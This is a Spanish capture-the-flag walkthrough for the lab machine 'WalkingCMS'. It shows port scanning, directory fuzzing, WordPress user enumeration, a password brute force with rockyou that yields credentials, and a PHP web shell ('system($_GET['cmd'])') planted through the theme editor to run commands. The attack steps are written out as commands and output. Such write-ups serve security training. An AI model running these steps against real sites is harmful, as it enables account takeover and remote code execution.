# Máquina WalkingCMS

# Despliegue de la Máquina

Vamos a iniciar la máquina mediante el comando (bash auto_deploy.sh walkingcms.tar)

##Escaneo de puertos

Ejecutamos este comando

```
sudo nmap -sSCV -n -Pn --min-rate 5000 -p- --open 172.17.0.2
```

Resultado
Podemos observar que es el puerto 80 el que está abierto, con lo cual podemos ir al navegador e introducir la IP.
 La página por defecto de Apache en Debian muestra el mensaje "Apache2 Debian Default Page".
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Como es una pagina web de Apache, podemos proceder a realizar fuzzing para averiguar el contendido de la pagina(Directorios/archivos)
Para ello vamos a realizar la ejecucion de este comando.
```
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```
Resultado
```
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/icons/               (Status: 403) [Size: 275]
/wordpress/           (Status: 200) [Size: 52441]
/server-status/       (Status: 403) [Size: 275]
Progress: 220560 / 220561 (100.00%)
```
En el resultado aparece wordpress con lo cual podemos intuir que el servidor está alojado en wordpress.

Con lo cual podemos usar la herramienta wpscan, que nos ayuda a poder investigar los posibles directorios, usuarios....
```
wpscan --url http://172.17.0.2/wordpress/ --enumerate u vp
```
En este caso nos salió este resultado.
Donde encontramos al usuario (Mario)
```
[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
```

# Fuerza Bruta
Como conocemos el posible usuario podremos realizar un atauqe de fuerza bruta al panel de wordpress.
Con lo cual sería este comando.
```
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

Resultado

El ataque dió como resultado que la contraseña del usuario mario es (love).
Con lo cual vamos a tratar de iniciar sesion en el panel de wordpress con estas credenciales.
```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                                                                                         
Trying mario / stephen Time: 00:00:02
```

Para ello accederemos al directorio /wp-admin.
Y podremos iniciar sesion sin problemas en el panel de wordpress.

# Explotación

Una vez dentro del wordpress en el apartado de la izquierda, tendremos una opcion que se llama apariencia.
Dentro de apariencia, tenemos la opción de (Theme code Editor)
Nos aparecerá un código index.php que podremos modificar, en el cual vamos a colocar este código 
```
<?php
	system($_GET['cmd']);
?>
```
Ahora nos vamos dirigir a la direccion del archivo donde está nuestro codigo con el index.php modificado,
colocamos esta URL con un valor al parámetro CMD.
```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=id
```






